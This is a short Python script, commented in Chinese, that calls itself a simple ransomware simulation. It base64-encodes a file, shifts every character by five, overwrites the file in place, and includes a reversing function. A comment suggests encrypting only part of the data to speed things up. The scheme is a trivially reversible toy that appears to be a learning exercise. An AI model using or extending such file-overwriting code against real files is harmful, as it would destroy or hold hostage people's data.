import base64
'''
该代码用于实现简单的勒索病毒模拟
采用base64编码（因为它可以将任何二进制数据转为英文字母）
然后对照ascii码表将所有字符加5，将整个文件加密耗费时间
可进行改进：只加密部分数据，即可实现效果
'''
def jiaami(filepath):
    with open(filepath,'rb') as f:
        data = f.read()
    data = base64.b64encode(data).decode('utf-8')
    jiami=''
    for i in data:
        i=chr(ord(i)+5)
        jiami+=i
    with open(filepath,'wb') as f:
        f.write(jiami.encode('utf-8'))
'''
事实上关于文件编码，文本和二进制模式打开文件没有区别
一个是在代开文件时指定编码，一个是在操作时指定，都需要编码方式
差别在于输出时是否自动解析，一些视频编码不具备可先不指定
仅仅取出数据不解析，以及是否处理换行
'''
def jiemi(fileath):
    with open(fileath,'rb') as f:
        data = f.read()
    jiemi=''
    for i in data.decode():
        i=chr(ord(i)-5)
        jiemi+=i
    with open(fileath,'wb') as f:
        jiemi=base64.b64decode(jiemi)
        f.write(jiemi)

if __name__ == '__main__':

    jiaami("勒索/2.jpg")
    jiemi("勒索/2.jpg")
